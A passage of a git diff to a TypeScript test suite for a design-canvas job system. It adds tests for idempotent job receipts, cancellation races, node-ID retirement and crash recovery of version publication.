+      assert.equal(repaired.nodes[0]?.state, scenario.status);
+      assert.equal(repaired.nodes[0]?.error, scenario.status === "failed" ? scenario.error : null);
+
+      const next = await createDesignJob(dataDir, projectId, {
+        kind: scenario.kind,
+        ...FIXTURE_JOB_IDENTITY,
+        nodeId: "node-target",
+      }, 400 + index);
+      assert.notEqual(next.job.id, created.job.id);
+      await cancelDesignJob(dataDir, projectId, next.job.id, 500 + index);
+      assert.deepEqual(await recoverInterruptedDesignJobs(dataDir, projectId, 600 + index), []);
+    } finally {
+      await rm(dataDir, { recursive: true, force: true });
+    }
+  }
+});
+
 test("an exhausted idempotency receipt budget rejects before creating orphan Job files", async () => {
   const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-receipt-limit-"));
   const projectId = "project-receipt-limit";
@@ -146,9 +890,157 @@ test("an exhausted idempotency receipt budget rejects before creating orphan Job
 
     await assert.rejects(createDesignJob(dataDir, projectId, {
       kind: "main-agent",
+      ...FIXTURE_JOB_IDENTITY,
       idempotencyKey: "one-too-many",
+      promptHash: "a".repeat(64),
     }), /receipt limit/i);
     assert.deepEqual(await readdir(join(designDir, "jobs")), []);
+  } finally {
+    await rm(dataDir, { recursive: true, force: true });
+  }
+});
+
+test("idempotency receipts bind the normalized request and atomically replace failed attempts", async () => {
+  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-receipt-identity-"));
+  const projectId = "project-receipt-identity";
+  const base = {
+    kind: "main-agent" as const,
+    runnerId: "claude",
+    model: "sonnet",
+    idempotencyKey: "quick-start-one",
+    promptHash: "a".repeat(64),
+    contextNodeIds: [] as string[],
+  };
+  try {
+    await initializeDesignProject(dataDir, projectId);
+    const first = await createDesignJob(dataDir, projectId, base, 100);
+    assert.equal(first.reused, false);
+    const activeDuplicate = await createDesignJob(dataDir, projectId, base, 101);
+    assert.equal(activeDuplicate.reused, true);
+    assert.equal(activeDuplicate.job.id, first.job.id);
+
+    await assert.rejects(createDesignJob(dataDir, projectId, {
+      ...base,
+      promptHash: "b".repeat(64),
+    }, 102), /different Design Agent request/i);
+    await assert.rejects(createDesignJob(dataDir, projectId, {
+      ...base,
+      model: "opus",
+    }, 103), /different Design Agent request/i);
+
+    await updateDesignJob(dataDir, projectId, first.job.id, { status: "failed", error: "provider failed" }, 104);
+    const successor = await createDesignJob(dataDir, projectId, base, 105);
+    assert.equal(successor.reused, false);
+    assert.notEqual(successor.job.id, first.job.id);
+    assert.equal(successor.job.status, "queued");
+    const successorDuplicate = await createDesignJob(dataDir, projectId, base, 106);
+    assert.equal(successorDuplicate.reused, true);
+    assert.equal(successorDuplicate.job.id, successor.job.id);
+
+    await updateDesignJob(dataDir, projectId, successor.job.id, { status: "cancelled", error: "cancelled" }, 107);
+    const concurrent = await Promise.all([
+      createDesignJob(dataDir, projectId, base, 108),
+      createDesignJob(dataDir, projectId, base, 108),
+    ]);
+    assert.equal(new Set(concurrent.map((entry) => entry.job.id)).size, 1);
+    assert.deepEqual(concurrent.map((entry) => entry.reused).sort(), [false, true]);
+
+    const project = JSON.parse(await readFile(
+      join(dataDir, "projects", projectId, "design", "project.json"),
+      "utf8",
+    ));
+    const receipt = project.turnReceipts["main-agent:main:quick-start-one"];
+    assert.equal(receipt.jobId, concurrent[0]!.job.id);
+    assert.match(receipt.requestHash, /^[a-f0-9]{64}$/);
+    assert.equal(receipt.authorityHash, concurrent[0]!.job.contextHash);
+  } finally {
+    await rm(dataDir, { recursive: true, force: true });
+  }
+});
+
+test("restart recovery keeps a committed idempotent Main plan terminal-sticky", async () => {
+  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-main-commit-recovery-"));
+  const projectId = "project-main-commit-recovery";
+  const request = {
+    kind: "main-agent" as const,
+    runnerId: "claude",
+    model: "sonnet",
+    idempotencyKey: "committed-main-plan",
+    promptHash: "c".repeat(64),
+  };
+  try {
+    await initializeDesignProject(dataDir, projectId);
+    const created = await createDesignJob(dataDir, projectId, request, 100);
+    assert.ok(created.receiptKey);
+    await updateDesignJob(dataDir, projectId, created.job.id, { status: "running" }, 101);
+    const execution = await reserveDesignMainPlanExecution(dataDir, projectId, {
+      jobId: created.job.id,
+      receiptKey: created.receiptKey!,
+      planPayload: JSON.stringify({
+        reply: "Committed",
+        canvasIntents: [{ type: "add-node", node: { id: "node-committed", kind: "page" } }],
+        dispatches: [],
+      }),
+      planningAuthorityHash: "d".repeat(64),
+      canvasRevision: 0,
+    }, 102);
+    const canvas = await mutateDesignCanvas(dataDir, projectId, {
+      expectedRevision: 0,
+      intents: [{ type: "add-node", node: { id: "node-committed", kind: "page" } }],
+      mainPlanApplication: {
+        jobId: created.job.id,
+        receiptKey: created.receiptKey!,
+        planHash: execution.planHash,
+      },
+    }, 103);
+    const rawProject = JSON.parse(await readFile(
+      join(dataDir, "projects", projectId, "design", "project.json"),
+      "utf8",
+    ));
+    assert.equal(rawProject.turnReceipts[created.receiptKey!].mainPlanAppliedRevision, canvas.revision);
+
+    await recoverInterruptedDesignJobs(dataDir, projectId, 104);
+    const retry = await createDesignJob(dataDir, projectId, request, 105);
+    assert.equal(retry.reused, true);
+    assert.equal(retry.job.id, created.job.id);
+    assert.equal(retry.job.status, "cancelled");
+    assert.deepEqual((await getDesignCanvas(dataDir, projectId)).nodeOrder, ["node-committed"]);
+    assert.equal((await listDesignJobs(dataDir, projectId)).filter((job) => job.kind === "main-agent").length, 1);
+  } finally {
+    await rm(dataDir, { recursive: true, force: true });
+  }
+});
+
+test("retired Node identity exhaustion rejects atomically without corrupting the Project", async () => {
+  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-retired-limit-"));
+  const projectId = "project-retired-limit";
+  try {
+    await initializeDesignProject(dataDir, projectId);
+    const projectPath = join(dataDir, "projects", projectId, "design", "project.json");
+    const project = JSON.parse(await readFile(projectPath, "utf8"));
+    project.retiredNodeIds = Array.from({ length: 5_000 }, (_, index) => `retired-${index}`);
+    await writeFile(projectPath, `${JSON.stringify(project, null, 2)}\n`);
+
+    const added = await mutateDesignCanvas(dataDir, projectId, {
+      expectedRevision: 0,
+      intents: [{ type: "add-node", node: { id: "node-over-limit", kind: "page" } }],
+    });
+    const bytesBefore = await readFile(projectPath);
+    await assert.rejects(mutateDesignCanvas(dataDir, projectId, {
+      expectedRevision: added.revision,
+      intents: [{ type: "remove-node", nodeId: "node-over-limit" }],
+    }), /retired Node identity limit/i);
+    assert.deepEqual(await readFile(projectPath), bytesBefore);
+    const canvas = await getDesignCanvas(dataDir, projectId);
+    assert.equal(canvas.revision, added.revision);
+    assert.equal(canvas.nodes[0]?.id, "node-over-limit");
+
+    await assert.rejects(
+      undoDesignCanvas(dataDir, projectId, canvas.revision),
+      /retired Node identity limit/i,
+    );
+    assert.deepEqual(await readFile(projectPath), bytesBefore);
+    assert.equal((await getDesignCanvas(dataDir, projectId)).nodes[0]?.id, "node-over-limit");
   } finally {
     await rm(dataDir, { recursive: true, force: true });
   }
@@ -209,7 +1101,7 @@ test("viewport-only saves do not consume undo history or clear redo", async () =
 
 test("frozen context rejects a payload set beyond the global byte budget", () => {
   assert.throws(() => assertDesignFrozenContextBudget({
-    schemaVersion: 1,
+    schemaVersion: 2,
     projectId: "project-budget",
     canvasRevision: 1,
     targetNodeId: null,
@@ -221,9 +1113,13 @@ test("frozen context rejects a payload set beyond the global byte budget", () =>
       state: "ready",
       geometry: { x: 0, y: 0, width: 320, height: 180 },
       selectedVersionId: null,
+      selectedVersionContentKind: null,
       selectedVersionChecksum: null,
       selectedVersionBytes: null,
       selectedVersionPath: null,
+      selectedVersionJobId: null,
+      selectedVersionRunnerId: null,
+      selectedVersionModel: null,
       selectedVersionAssetPins: [],
       assetId: `asset-${"a".repeat(32)}`,
       assetChecksum: "a".repeat(64),
@@ -243,7 +1139,11 @@ test("removing a Node with an active scoped Agent Job is rejected", async () => 
       expectedRevision: 0,
       intents: [{ type: "add-node", node: { id: "node-page", kind: "page" } }],
     });
-    await createDesignJob(dataDir, projectId, { kind: "node-generation", nodeId: "node-page" });
+    await createDesignJob(dataDir, projectId, {
+      kind: "node-generation",
+      ...FIXTURE_JOB_IDENTITY,
+      nodeId: "node-page",
+    });
     const current = await getDesignCanvas(dataDir, projectId);
     await assert.rejects(mutateDesignCanvas(dataDir, projectId, {
       expectedRevision: current.revision,
@@ -265,6 +1165,7 @@ test("undo and redo refuse to remove or revive an active-Job Node without consum
     });
     const active = await createDesignJob(dataDir, projectId, {
       kind: "node-generation",
+      ...FIXTURE_JOB_IDENTITY,
       nodeId: "node-page",
     });
     const beforeUndo = await getDesignCanvas(dataDir, projectId);
@@ -322,6 +1223,48 @@ test("a removed Node identity cannot be explicitly reused for a new Node", async
       expectedRevision: 2,
       intents: [{ type: "add-node", node: { id: "node-page", kind: "component" } }],
     }), /retired|already exists/i);
+  } finally {
+    await rm(dataDir, { recursive: true, force: true });
+  }
+});
+
+test("undoing an added generated Node permanently retires its immutable namespace", async () => {
+  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-undo-retired-node-"));
+  const projectId = "project-undo-retired-node";
+  try {
+    await initializeDesignProject(dataDir, projectId);
+    await mutateDesignCanvas(dataDir, projectId, {
+      expectedRevision: 0,
+      intents: [{ type: "add-node", node: { id: "node-page", kind: "page" } }],
+    });
+    const published = await publishDesignVersion(dataDir, projectId, {
+      nodeId: "node-page",
+      html: "<!doctype html><html><head></head><body>immutable namespace</body></html>",
+      contextHash: "a".repeat(64),
+      canvasRevision: 1,
+      expectedHeadVersionId: null,
+      jobId: null,
+      runnerId: "fixture",
+      model: null,
+    });
+    const undone = await undoDesignCanvas(
+      dataDir,
+      projectId,
+      (await getDesignCanvas(dataDir, projectId)).revision,
+    );
+    assert.deepEqual(undone.nodes, []);
+    const edited = await mutateDesignCanvas(dataDir, projectId, {
+      expectedRevision: undone.revision,
+      intents: [{ type: "add-node", node: { id: "node-other", kind: "component" } }],
+    });
+    await assert.rejects(mutateDesignCanvas(dataDir, projectId, {
+      expectedRevision: edited.revision,
+      intents: [{ type: "add-node", node: { id: "node-page", kind: "component" } }],
+    }), /retired|already exists/i);
+    assert.deepEqual(
+      (await listDesignVersions(dataDir, projectId, "node-page")).map((version) => version.id),
+      [published.manifest.id],
+    );
   } finally {
     await rm(dataDir, { recursive: true, force: true });
   }
@@ -455,7 +1398,7 @@ test("single-HTML Node versions publish immutably and late head-CAS results beco
       contextHash: "a".repeat(64),
       canvasRevision: 1,
       expectedHeadVersionId: null,
-      jobId: "job-first",
+      jobId: null,
       runnerId: "fake",
       model: null,
     }, 300);
@@ -468,21 +1411,50 @@ test("single-HTML Node versions publish immutably and late head-CAS results beco
 
     const second = await publishDesignVersion(dataDir, projectId, {
       nodeId: "node-home",
-      html: "<!doctype html><html><head><style>body{color:blue}</style></head><body>second</body></html>",
+      html: servedHtml.replace(
+        "</body>",
+        "<p>second version preserves its pinned image</p></body>",
+      ),
       contextHash: "b".repeat(64),
       canvasRevision: 1,
       expectedHeadVersionId: first.manifest.id,
-      jobId: "job-second",
+      jobId: null,
       runnerId: "fake",
       model: null,
     });
+    assert.deepEqual(second.manifest.assetPins, [{ assetId: asset.id, checksum: asset.checksum }]);
+    const secondFile = await resolveDesignVersionFile(dataDir, projectId, "node-home", second.manifest.id, "index.html");
+    const secondHtml = await readFile(secondFile.path, "utf8");
+    assert.match(secondHtml, new RegExp(`versionId=${second.manifest.id}`));
+    assert.doesNotMatch(secondHtml, new RegExp(`versionId=${first.manifest.id}`));
+
+    await assert.rejects(publishDesignVersion(dataDir, projectId, {
+      nodeId: "node-home",
+      html: servedHtml,
+      contextHash: "e".repeat(64),
+      canvasRevision: 1,
+      expectedHeadVersionId: second.manifest.id,
+      jobId: null,
+      runnerId: "fake",
+      model: null,
+    }), /not authorized by its expected Head Version/i);
+    await assert.rejects(publishDesignVersion(dataDir, projectId, {
+      nodeId: "node-home",
+      html: secondHtml.replace(`/api/projects/${projectId}/`, "/api/projects/project-other/"),
+      contextHash: "f".repeat(64),
+      canvasRevision: 1,
+      expectedHeadVersionId: second.manifest.id,
+      jobId: null,
+      runnerId: "fake",
+      model: null,
+    }), /not authorized by its expected Head Version/i);
     const late = await publishDesignVersion(dataDir, projectId, {
       nodeId: "node-home",
       html: "<!doctype html><html><head><style>body{color:red}</style></head><body>late</body></html>",
       contextHash: "c".repeat(64),
       canvasRevision: 1,
       expectedHeadVersionId: first.manifest.id,
-      jobId: "job-late",
+      jobId: null,
       runnerId: "fake",
       model: null,
     });
@@ -500,7 +1472,7 @@ test("single-HTML Node versions publish immutably and late head-CAS results beco
         contextHash: "d".repeat(64),
         canvasRevision: 1,
         expectedHeadVersionId: second.manifest.id,
-        jobId: "job-unsafe",
+        jobId: null,
         runnerId: "fake",
         model: null,
       }),
@@ -513,7 +1485,7 @@ test("single-HTML Node versions publish immutably and late head-CAS results beco
         contextHash: "f".repeat(64),
         canvasRevision: 1,
         expectedHeadVersionId: second.manifest.id,
-        jobId: "job-self-probe",
+        jobId: null,
         runnerId: "fake",
         model: null,
       }),
@@ -526,7 +1498,7 @@ test("single-HTML Node versions publish immutably and late head-CAS results beco
         contextHash: "f".repeat(64),
         canvasRevision: 1,
         expectedHeadVersionId: second.manifest.id,
-        jobId: "job-srcset",
+        jobId: null,
         runnerId: "fake",
         model: null,
       }),
@@ -544,7 +1516,7 @@ test("single-HTML Node versions publish immutably and late head-CAS results beco
       contextHash: "e".repeat(64),
       canvasRevision: selectedOld.revision,
       expectedHeadVersionId: second.manifest.id,
-      jobId: "job-third",
+      jobId: null,
       runnerId: "fake",
       model: null,
     });
@@ -581,6 +1553,478 @@ test("single-HTML Node versions publish immutably and late head-CAS results beco
   }
 });
 
+test("a cancelled generation Job cannot publish its staged Version", async () => {
+  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-cancelled-publication-"));
+  const projectId = "project-cancelled-publication";
+  try {
+    await initializeDesignProject(dataDir, projectId);
+    await mutateDesignCanvas(dataDir, projectId, {
+      expectedRevision: 0,
+      intents: [{ type: "add-node", node: { id: "node-page", kind: "page" } }],
+    });
+    const created = await createDesignJob(dataDir, projectId, {
+      kind: "node-generation",
+      ...FIXTURE_JOB_IDENTITY,
+      nodeId: "node-page",
+    });
+    await updateDesignJob(dataDir, projectId, created.job.id, { status: "running" });
+    await updateDesignJob(dataDir, projectId, created.job.id, { status: "validating" });
+    await cancelDesignJob(dataDir, projectId, created.job.id);
+
+    await assert.rejects(
+      publishDesignVersion(dataDir, projectId, {
+        nodeId: "node-page",
+        html: "<!doctype html><html><head></head><body>cancelled</body></html>",
+        contextHash: created.job.contextHash!,
+        canvasRevision: created.job.canvasRevision!,
+        expectedHeadVersionId: created.job.expectedHeadVersionId,
+        jobId: created.job.id,
+        runnerId: created.job.runnerId,
+        model: created.job.model,
+      }),
+      /active validating|cancelled|publication authority/i,
+    );
+    assert.equal((await getDesignJob(dataDir, projectId, created.job.id)).status, "cancelled");
+    assert.equal((await getDesignCanvas(dataDir, projectId)).nodes[0]?.currentVersionId, null);
+    assert.deepEqual(await listDesignVersions(dataDir, projectId, "node-page"), []);
+  } finally {
+    await rm(dataDir, { recursive: true, force: true });
+  }
+});
+
+test("publishing a generation Version terminalizes its Job before cancellation can interleave", async () => {
+  const dataDir = await mkdtemp(join(tmpdir(), "dezin-design-publication-boundary-"));
+  const projectId = "project-publication-boundary";
+  try {
+    await initializeDesignProject(dataDir, projectId);
+    await mutateDesignCanvas(dataDir, projectId, {
+      expectedRevision: 0,
+      intents: [{ type: "add-node", node: { id: "node-page", kind: "page" } }],
+    });
+    const created = await createDesignJob(dataDir, projectId, {
+      kind: "node-generation",
+      ...FIXTURE_JOB_IDENTITY,
+      nodeId: "node-page",
+    });
+    await updateDesignJob(dataDir, projectId, created.job.id, { status: "running" });
+    await updateDesignJob(dataDir, projectId, created.job.id, { status: "validating" });
+
+    const published = await publishDesignVersion(dataDir, projectId, {
+      nodeId: "node-page",
+      html: "<!doctype html><html><head></head><body>ready</body></html>",
+      contextHash: created.job.contextHash!,
+      canvasRevision: created.job.canvasRevision!,
+      expectedHeadVersionId: created.job.expectedHeadVersionId,
+      jobId: created.job.id,
+      runnerId: created.job.runnerId,
+      model: created.job.model,
+    });
+    const cancelledAfterPublish = await cancelDesignJob(dataDir, projectId, created.job.id);
+
+    assert.equal(cancelledAfterPublish.status, "ready");
+    assert.equal(cancelledAfterPublish.cancelRequested, false);
+    assert.equal(cancelledAfterPublish.versionId, published.manifest.id);
+    assert.equal((await getDesignCanvas(dataDir, projectId)).nodes[0]?.currentVersionId, published.manifest.id);
+  } finally {
+    await rm(dataDir, { recursive: true, force: true });
+  }
+});
+
+test("publication WAL recovers every durable crash phase without leaving single-flight ownership", async () => {
+  const phases: DesignVersionPublicationPhase[] = ["marker", "pending", "target", "canvas", "job"];
+  for (const [phaseIndex, phase] of phases.entries()) {
+    const fixture = await validatingPublicationFixture(phase);
+    try {
+      await assert.rejects(
+        publishDesignVersion(fixture.dataDir, fixture.projectId, {
+          nodeId: "node-page",
+          html: `<!doctype html><html><head></head><body>${phase}</body></html>`,
+          contextHash: fixture.job.contextHash!,
+          canvasRevision: fixture.job.canvasRevision!,
+          expectedHeadVersionId: fixture.job.expectedHeadVersionId,
+          jobId: fixture.job.id,
+          runnerId: fixture.job.runnerId,
+          model: fixture.job.model,
+        }, 1_000 + phaseIndex, {
+          simulateProcessCrash: true,
+          afterPhase: async (completed) => {
+            if (phase === "marker" && completed === "marker") {
+              const markerPath = join(
+                fixture.dataDir,
+                "projects",
+                fixture.projectId,
+                "design",
+                "transactions",
+                "publications",
+                `${fixture.job.id}.json`,
+              );
+              const marker = JSON.parse(await readFile(markerPath, "utf8"));
+              assert.equal(marker.projectId, fixture.projectId);
+              assert.equal(marker.jobId, fixture.job.id);
+              assert.equal(marker.nodeId, "node-page");
+              assert.equal(marker.manifest.jobId, fixture.job.id);
+              assert.equal(marker.manifest.runnerId, fixture.job.runnerId);
+              assert.equal(marker.manifest.model, fixture.job.model);
+              assert.equal(marker.manifest.contextHash, fixture.job.contextHash);
+              assert.match(marker.manifest.checksum, /^[a-f0-9]{64}$/);
+              assert.ok(marker.manifest.bytes > 0);
+              assert.match(marker.checksum, /^[a-f0-9]{64}$/);
+            }
+            if (completed === phase) throw new Error(`simulated crash after ${phase}`);
+          },
+        }),
+        new RegExp(`simulated crash after ${phase}`),
+      );
+
+      await recoverInterruptedDesignJobs(fixture.dataDir, fixture.projectId, 2_000 + phaseIndex);
+      const job = await getDesignJob(fixture.dataDir, fixture.projectId, fixture.job.id);
+      const canvas = await getDesignCanvas(fixture.dataDir, fixture.projectId);
+      const versions = await listDesignVersions(fixture.dataDir, fixture.projectId, "node-page");
+      if (phase === "marker") {
+        assert.equal(job.status, "cancelled");
+        assert.equal(canvas.nodes[0]?.currentVersionId, null);
+        assert.deepEqual(versions, []);
+      } else {
+        assert.equal(job.status, "ready");
+        assert.equal(versions.length, 1);
+        assert.equal(job.versionId, versions[0]?.id);
+        assert.equal(canvas.nodes[0]?.currentVersionId, versions[0]?.id);
+      }
+      assert.equal(canvas.nodes[0]?.activeJobId, null);
+      assert.deepEqual(
+        await readdir(join(fixture.dataDir, "projects", fixture.projectId, "design", "transactions", "publications")),
+        [],
+      );
+      const next = await createDesignJob(fixture.dataDir, fixture.projectId, {
+        kind: "node-generation",
+        ...FIXTURE_JOB_IDENTITY,
+        nodeId: "node-page",
+      });
+      await cancelDesignJob(fixture.dataDir, fixture.projectId, next.job.id);
+      assert.deepEqual(await recoverInterruptedDesignJobs(fixture.dataDir, fixture.projectId, 3_000 + phaseIndex), []);
+    } finally {
+      await rm(fixture.dataDir, { recursive: true, force: true });
+    }
+  }
+});
+
+test("live publication recovery keeps a queued Canvas mutation behind the same project lock", async () => {
+  const fixture = await validatingPublicationFixture("queued-mutation");
+  try {
+    const before = await getDesignCanvas(fixture.dataDir, fixture.projectId);
+    let queuedMutation: Promise<{ ok: true } | { ok: false; error: unknown }> | undefined;
+    const published = await publishDesignVersion(fixture.dataDir, fixture.projectId, {
+      nodeId: "node-page",
+      html: "<!doctype html><html><head></head><body>publish before queued mutation</body></html>",
+      contextHash: fixture.job.contextHash!,
+      canvasRevision: fixture.job.canvasRevision!,
+      expectedHeadVersionId: fixture.job.expectedHeadVersionId,
+      jobId: fixture.job.id,
+      runnerId: fixture.job.runnerId,
+      model: fixture.job.model,
+    }, 8_000, {
+      afterPhase(phase) {
+        if (phase !== "pending") return;
+        queuedMutation = mutateDesignCanvas(fixture.dataDir, fixture.projectId, {
+          expectedRevision: before.revision,
+          intents: [{ type: "add-node", node: { id: "node-other", kind: "research" } }],
+        }).then(() => ({ ok: true as const }), (error: unknown) => ({ ok: false as const, error }));
+        throw new Error("injected live failure after the complete pending payload");
+      },
+    });
+
+    assert.equal(published.job?.status, "ready");
+    assert.equal(published.job?.versionId, published.manifest.id);
+    assert.ok(queuedMutation);
+    const mutation = await queuedMutation;
+    assert.equal(mutation.ok, false);
+    if (!mutation.ok) assert.ok(mutation.error instanceof DesignRevisionConflictError);
+    const canvas = await getDesignCanvas(fixture.dataDir, fixture.projectId);
+    assert.equal(canvas.nodes.some((node) => node.id === "node-other"), false);
+    assert.equal(canvas.nodes[0]?.currentVersionId, published.manifest.id);
+    assert.deepEqual(
+      await readdir(join(fixture.dataDir, "projects", fixture.projectId, "design", "transactions", "publications")),
+      [],
+    );
+  } finally {
+    await rm(fixture.dataDir, { recursive: true, force: true });
+  }
+});
+
+test("live publication recovery terminalizes before a queued cancellation can overtake it", async () => {
+  const fixture = await validatingPublicationFixture("queued-cancel");
+  try {
+    let queuedCancellation: Promise<Awaited<ReturnType<typeof cancelDesignJob>>> | undefined;
+    const published = await publishDesignVersion(fixture.dataDir, fixture.projectId, {
+      nodeId: "node-page",
+      html: "<!doctype html><html><head></head><body>publish before queued cancel</body></html>",
+      contextHash: fixture.job.contextHash!,
+      canvasRevision: fixture.job.canvasRevision!,
+      expectedHeadVersionId: fixture.job.expectedHeadVersionId,
+      jobId: fixture.job.id,
+      runnerId: fixture.job.runnerId,
+      model: fixture.job.model,
+    }, 8_100, {
+      afterPhase(phase) {
+        if (phase !== "pending") return;
+        queuedCancellation = cancelDesignJob(fixture.dataDir, fixture.projectId, fixture.job.id, 8_200);
+        throw new Error("injected live failure before queued cancellation");
+      },
+    });
+
+    assert.equal(published.job?.status, "ready");
+    assert.ok(queuedCancellation);
+    assert.equal((await queuedCancellation).status, "ready");
+    const job = await getDesignJob(fixture.dataDir, fixture.projectId, fixture.job.id);
+    const canvas = await getDesignCanvas(fixture.dataDir, fixture.projectId);
+    assert.equal(job.status, "ready");
+    assert.equal(canvas.nodes[0]?.state, "ready");
+    assert.equal(canvas.nodes[0]?.activeJobId, null);
+    assert.deepEqual(
+      await readdir(join(fixture.dataDir, "projects", fixture.projectId, "design", "transactions", "publications")),
+      [],
+    );
+  } finally {
+    await rm(fixture.dataDir, { recursive: true, force: true });
+  }
+});
+
+test("a durable publication marker is a project-wide write barrier until recovery succeeds", async () => {
+  const fixture = await validatingPublicationFixture("write-barrier");
+  try {
+    const before = await getDesignCanvas(fixture.dataDir, fixture.projectId);
+    await assert.rejects(
+      publishDesignVersion(fixture.dataDir, fixture.projectId, {
+        nodeId: "node-page",
+        html: "<!doctype html><html><head></head><body>durable crash marker</body></html>",
+        contextHash: fixture.job.contextHash!,
+        canvasRevision: fixture.job.canvasRevision!,
+        expectedHeadVersionId: fixture.job.expectedHeadVersionId,
+        jobId: fixture.job.id,
+        runnerId: fixture.job.runnerId,
+        model: fixture.job.model,
+      }, 8_300, {
+        simulateProcessCrash: true,
+        afterPhase(phase) {
+          if (phase === "pending") throw new Error("simulated process exit with a complete pending payload");
+        },
+      }),
+      /simulated process exit/i,
+    );
+
+    await assert.rejects(
+      mutateDesignCanvas(fixture.dataDir, fixture.projectId, {
+        expectedRevision: before.revision,
+        intents: [{ type: "add-node", node: { id: "node-overtake", kind: "research" } }],
+      }),
+      /publication.*recover|recover.*publication/i,
+    );
+    await assert.rejects(
+      cancelDesignJob(fixture.dataDir, fixture.projectId, fixture.job.id, 8_400),
+      /publication.*recover|recover.*publication/i,
+    );
+    const persistedWhileBlocked = JSON.parse(await readFile(
+      join(fixture.dataDir, "projects", fixture.projectId, "design", "project.json"),
+      "utf8",
+    ));
+    assert.equal(persistedWhileBlocked.revision, before.revision);
+
+    const recovered = await recoverInterruptedDesignJobs(fixture.dataDir, fixture.projectId, 8_500);
+    assert.equal(recovered.find((job) => job.id === fixture.job.id)?.status, "ready");
+    const after = await getDesignCanvas(fixture.dataDir, fixture.projectId);
+    assert.equal(after.nodes[0]?.activeJobId, null);
+    assert.equal(after.nodes[0]?.state, "ready");
+  } finally {
+    await rm(fixture.dataDir, { recursive: true, force: true });
+  }
+});
+
+test("a durable publication marker blocks every public Version and Job read until recovery", async () => {
+  for (const crashPhase of ["target", "job"] as const) {
+    const fixture = await validatingPublicationFixture(`read-barrier-${crashPhase}`);
+    try {
+      await assert.rejects(
+        publishDesignVersion(fixture.dataDir, fixture.projectId, {
+          nodeId: "node-page",
+          html: `<!doctype html><html><head></head><body>crash after ${crashPhase}</body></html>`,
+          contextHash: fixture.job.contextHash!,
+          canvasRevision: fixture.job.canvasRevision!,
+          expectedHeadVersionId: fixture.job.expectedHeadVersionId,
+          jobId: fixture.job.id,
+          runnerId: fixture.job.runnerId,
+          model: fixture.job.model,
+        }, 8_600, {
+          simulateProcessCrash: true,
+          afterPhase(phase) {
+            if (phase === crashPhase) throw new Error(`simulated process exit after ${crashPhase}`);
+          },
+        }),
+        new RegExp(`simulated process exit after ${crashPhase}`),
+      );
+
+      const designDir = join(fixture.dataDir, "projects", fixture.projectId, "design");
+      const marker = JSON.parse(await readFile(
+        join(designDir, "transactions", "publications", `${fixture.job.id}.json`),
+        "utf8",
+      ));
+      const versionId = marker.manifest.id as string;
+      const blockedReads = [
+        () => getDesignCanvas(fixture.dataDir, fixture.projectId),
+        () => listDesignVersions(fixture.dataDir, fixture.projectId, "node-page"),
+        () => getDesignVersion(fixture.dataDir, fixture.projectId, "node-page", versionId),
+        () => resolveDesignVersionFile(fixture.dataDir, fixture.projectId, "node-page", versionId, "index.html"),
+        () => getDesignJob(fixture.dataDir, fixture.projectId, fixture.job.id),
+        () => listDesignJobs(fixture.dataDir, fixture.projectId),
+      ];
+      for (const read of blockedReads) {
+        await assert.rejects(read(), /publication recovery must complete/i);
+      }
+
+      await recoverInterruptedDesignJobs(fixture.dataDir, fixture.projectId, 8_700);
+      const canvas = await getDesignCanvas(fixture.dataDir, fixture.projectId);
+      const versions = await listDesignVersions(fixture.dataDir, fixture.projectId, "node-page");
+      const version = await getDesignVersion(fixture.dataDir, fixture.projectId, "node-page", versionId);
+      const resolved = await resolveDesignVersionFile(
+        fixture.dataDir,
+        fixture.projectId,
+        "node-page",
+        versionId,
+        "index.html",
+      );
+      const job = await getDesignJob(fixture.dataDir, fixture.projectId, fixture.job.id);
+      const jobs = await listDesignJobs(fixture.dataDir, fixture.projectId);
+      assert.equal(canvas.nodes[0]?.currentVersionId, versionId);
+      assert.deepEqual(versions.map((candidate) => candidate.id), [versionId]);
+      assert.equal(version.id, versionId);
+      assert.equal(resolved.manifest.id, versionId);
+      assert.equal(job.status, "ready");
+      assert.ok(jobs.some((candidate) => candidate.id === fixture.job.id && candidate.status === "ready"));
+    } finally {
+      await rm(fixture.dataDir, { recursive: true, force: true });
+    }
+  }
+});
+
+test("publication recovery rejects a corrupt marker and safely rolls back a mismatched pending payload", async () => {
+  for (const corruption of ["marker", "payload"] as const) {
+    const fixture = await validatingPublicationFixture(`corrupt-${corruption}`);
+    try {
+      const crashPhase: DesignVersionPublicationPhase = corruption === "marker" ? "marker" : "pending";
+      await assert.rejects(
+        publishDesignVersion(fixture.dataDir, fixture.projectId, {
+          nodeId: "node-page",
+          html: "<!doctype html><html><head></head><body>immutable</body></html>",
+          contextHash: fixture.job.contextHash!,
+          canvasRevision: fixture.job.canvasRevision!,
+          expectedHeadVersionId: fixture.job.expectedHeadVersionId,
+          jobId: fixture.job.id,
+          runnerId: fixture.job.runnerId,
+          model: fixture.job.model,
+        }, 4_000, {
+          simulateProcessCrash: true,
+          afterPhase: (completed) => {
+            if (completed === crashPhase) throw new Error(`simulated ${corruption} crash`);
+          },
+        }),
+        /simulated.*crash/i,
+      );
+      const designDir = join(fixture.dataDir, "projects", fixture.projectId, "design");
+      if (corruption === "marker") {
+        const markerPath = join(designDir, "transactions", "publications", `${fixture.job.id}.json`);
+        const marker = JSON.parse(await readFile(markerPath, "utf8"));
+        marker.followsHead = !marker.followsHead;
+        await writeFile(markerPath, `${JSON.stringify(marker, null, 2)}\n`);
+      } else {
+        const pendingVersions = await readdir(join(designDir, "nodes", "node-page", ".pending", "versions"));
+        assert.equal(pendingVersions.length, 1);
+        await writeFile(
+          join(designDir, "nodes", "node-page", ".pending", "versions", pendingVersions[0]!, "index.html"),
+          "tampered",
+        );
+      }
+
+      if (corruption === "marker") {
+        await assert.rejects(
+          recoverInterruptedDesignJobs(fixture.dataDir, fixture.projectId, 5_000),
+          /corrupt|checksum|payload|invalid/i,
+        );
+      } else {
+        const recovered = await recoverInterruptedDesignJobs(fixture.dataDir, fixture.projectId, 5_000);
+        assert.equal(recovered.find((job) => job.id === fixture.job.id)?.status, "cancelled");
+      }
+      if (corruption === "marker") {
+        // A corrupt durable marker intentionally keeps authoritative Canvas
+        // reads and every mutation behind the recovery barrier. Inspect the
+        // bytes directly here because the Canvas head cannot yet be proven.
+        await assert.rejects(
+          getDesignCanvas(fixture.dataDir, fixture.projectId),
+          /publication recovery must complete/i,
+        );
+        await assert.rejects(
